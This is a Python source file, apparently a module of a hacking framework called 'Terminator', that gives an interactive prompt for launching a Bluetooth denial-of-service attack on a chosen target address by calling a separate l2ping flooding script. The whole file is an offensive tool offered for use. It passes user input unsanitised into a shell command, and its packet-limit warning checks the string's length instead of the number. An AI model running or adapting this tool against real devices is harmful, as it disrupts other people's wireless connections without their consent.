import os
import time
import colorama
import sys
import subprocess
from colorama import Fore
colorama.init()
TARGET_ADDR=""
PACKAGE_SIZE=""
THREADS=""
shw = '''
Module Commands For "show"
==========================

      Command                          Description
      -------                          -----------
      show options                     Show options of the Module
'''
commands = '''
Module Commands For "show"
==========================

      Command                          Description
      -------                          -----------
      show options                     Show options of the Module

Module Commands
===============

      Command                          Description
      -------                          -----------
      set <option> <value>             Set specified option to specified value
      show <>                          Show specified command, options
      run                              Run the Module
'''
try:
    tmf = input('\033[4mtmf\033[0m-('+Fore.RED+'blueman/bluetooth_dos/l2ping'+Fore.RESET+') > ').strip(" ")
except KeyboardInterrupt:
    exit()
tmf = tmf.split()
while True:
    if tmf == []:
        pass
    elif tmf[0] == 'help':
        print(commands)
    elif tmf[0] == 'clear':
        os.system('clear')
    elif tmf[0] == 'back' or tmf[0] == 'exit':
        sys.exit()
    elif tmf[0] == 'show':
        if len(tmf) < 2:
            print(shw)
        else:
            try:
                if tmf[1] == 'options':
                    print('''
Module ('''+Fore.RED+'''blueman/bluetooth_dos/l2ping'''+Fore.RESET+''') Options:

      Option            Rank              Description                             Current Value
      --------          ------            -------------                           ---------------
      TARGET_ADDR       Required          Target Bluetooth Address                '''+TARGET_ADDR+'''
      PACKAGE_SIZE      Required          Package Size                            '''+PACKAGE_SIZE+'''
      THREADS           Required          Threads Count                           '''+THREADS+'''

Module About:

      Module Title : Bluetooth Denial Of Service
      Author       : G00Dway
      Version      : 1.5

Module Details:

      Detail 1     : Kills Connection Between Bluetooth Devices
      Detail 2     : Uses L2PING + DOS For Better Quality
      ---------------------------------------------------
      Warning 1    : This Module Will Use Interface (HCI0)
''')
                else:
                    print(shw)
                    print(Fore.RED+'[-]'+Fore.RESET+' Invalid Command For "show": "'+tmf[1]+'"')
            except:
                pass
    elif tmf[0] == 'set':
        if len(tmf) < 3:
            print(Fore.RED+'[-]'+Fore.RESET+' Usage: set <option> <value>')
        else:
            try:
                if tmf[1] == 'TARGET_ADDR' or tmf[1] == 'target_addr':
                    TARGET_ADDR=tmf[2]
                    print(Fore.BLUE+'[*]'+Fore.RESET+' TARGET_ADDR ==> '+TARGET_ADDR)
                elif tmf[1] == 'PACKAGE_SIZE' or tmf[1] == 'package_size':
                    PACKAGE_SIZE=tmf[2]
                    print(Fore.BLUE+'[*]'+Fore.RESET+' PACKAGE_SIZE ==> '+PACKAGE_SIZE)
                    if len(PACKAGE_SIZE) > 600:
                        print(Fore.RED+'[-]'+Fore.RESET+' More Than 600 Packets Can Pernamently Turn Off Bluetooth On Device!')
                elif tmf[1] == 'THREADS' or tmf[1] == 'threads':
                    THREADS=tmf[2]
                    print(Fore.BLUE+'[*]'+Fore.RESET+' THREADS ==> '+THREADS)
                else:
                    print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Option!')
            except:
                pass
    elif tmf[0] == 'run':
        if TARGET_ADDR == "" or PACKAGE_SIZE == "" or THREADS == "":
            print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
        else:
            try:
                os.system('python3 /usr/share/Terminator/modules/other/bluetooth.py '+TARGET_ADDR+' '+PACKAGE_SIZE+' '+THREADS)
                print(Fore.BLUE+'[*]'+Fore.RESET+' Module Execution Completed.')
            except Exception:
                pass
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' Unknown Command: "'+tmf[0]+'"')
    try:
        tmf = input('\033[4mtmf\033[0m-('+Fore.RED+'blueman/bluetooth_dos/l2ping'+Fore.RESET+') > ').strip(" ")
    except KeyboardInterrupt:
        exit()
    tmf = tmf.split()
